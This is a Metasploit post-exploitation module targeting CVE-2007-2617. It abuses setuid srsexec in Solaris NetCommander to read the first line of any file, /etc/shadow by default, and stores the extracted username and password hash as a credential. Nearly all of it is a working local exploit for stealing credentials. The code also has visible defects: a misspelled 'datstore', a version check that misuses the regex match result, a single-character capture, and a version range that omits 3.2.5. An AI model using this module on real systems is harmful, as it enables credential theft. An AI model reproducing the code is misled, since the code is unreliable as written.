##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Solaris srsexec Arbitrary File Reader',
        'Description'   => %q{ This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5 where srsexec in debug (-d) verbose (-v) mode
                               where the first line of an arbitrary file can be read since srsexec has the suid bit set.},
        'License'       => MSF_LICENSE,
        'Author'        => [
          'h00die', # metasploit module
          'anonymous' # discovery reported anonymously to https://labs.idefense.com           
        ],
        'Platform'      => [ 'solaris' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'References'    => [
          ['CVE','2007-2617'],
          ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],
          ['URL', 'https://www.securityfocus.com/archive/1/468235'],
          ['EDB', '320021']
        ],
        'DisclosureDate' => 'May 07 2007',
      ))
    register_options([
        OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
      ])

  end

  def check
    # This ls is based on the guidance in the sun alerts article
    # XXX need to full path ls
    uninstallers = cmd_exec('ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh')
    version = /UninstallNetConnect\.([\d\.]{11})\.sh/ =~ uninstallers
    unless version
      print_error 'NetConnect uninstall not found, either not installed or too new'
      return CheckCode::Safe
    end
    version = Gem::Version.new(version.split(".").map(&:to_i).join('.'))
    if version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
      print_good "#{version} is vulnerable"
      return CheckCode::Detected
    end
    CheckCode::Safe
  end

  def run
    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    if check != CheckCode::Detected
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    flag = rand_text_alpha rand(5..7)
    output = cmd_exec("/opt/SUNWsrspx/bin/srsexec -dvb #{datstore['FILE']} #{flag}")
    vprint_good(output)
    if datastore['FILE'] == '/etc/shadow'
      formatted_output = ''
      output.scan(/binaries file line: (.)$/){ |line|
        if line.length == 20
          formatted_output = line[0..18]
        else
          formatted_output = line
        end
      }
      credential_data = {
        address: thost,
        workspace_id: myworkspace.id,
        module_fullname: self.fullname,
        username: formatted_output.split(':')[0],
        private_data: formatted_output.split(':')[1],
        private_type: :nonreplayable_hash
      }
      create_credential(credential_data)
    end

  end
end
